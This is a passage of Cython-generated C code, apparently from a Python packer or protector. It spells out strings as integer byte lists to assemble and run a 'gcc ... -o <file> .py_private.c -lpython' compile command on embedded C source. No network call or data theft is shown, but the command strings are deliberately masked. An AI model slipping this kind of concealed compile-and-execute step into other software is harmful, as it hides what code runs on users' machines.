    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_EXPORT_PYTHON_EXECUTABLE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);

    
    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = PyList_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_32);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_38);
    __Pyx_GIVEREF(__pyx_int_38);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_38);
    __Pyx_INCREF(__pyx_int_32);
    __Pyx_GIVEREF(__pyx_int_32);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_32);
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
    __pyx_t_5 = PyNumber_Add(__pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 89, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_RUN); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);

    
    __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 87, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_SOURCE, __pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define) < 0) __PYX_ERR(0, 94, __pyx_L1_error)

  
  __pyx_t_3 = PyList_New(13); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_99);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5366, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 5365, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5368, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_46);

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5367, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5368, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5369, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5369, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5369, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);

  
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5370, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5369, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_5, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 5371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_46);

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5371, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, -1L, NULL, NULL, &__pyx_slice__2, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyUnicode_Join(((PyObject*)__pyx_t_3), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5368, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_1) < 0) __PYX_ERR(0, 5367, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_73);
  __Pyx_GIVEREF(__pyx_int_73);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_73);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(15); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_110);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5378, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5379, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5380, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5382, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5381, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5382, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5384, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5383, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_76);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5384, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5386, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5385, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_110);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5387, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
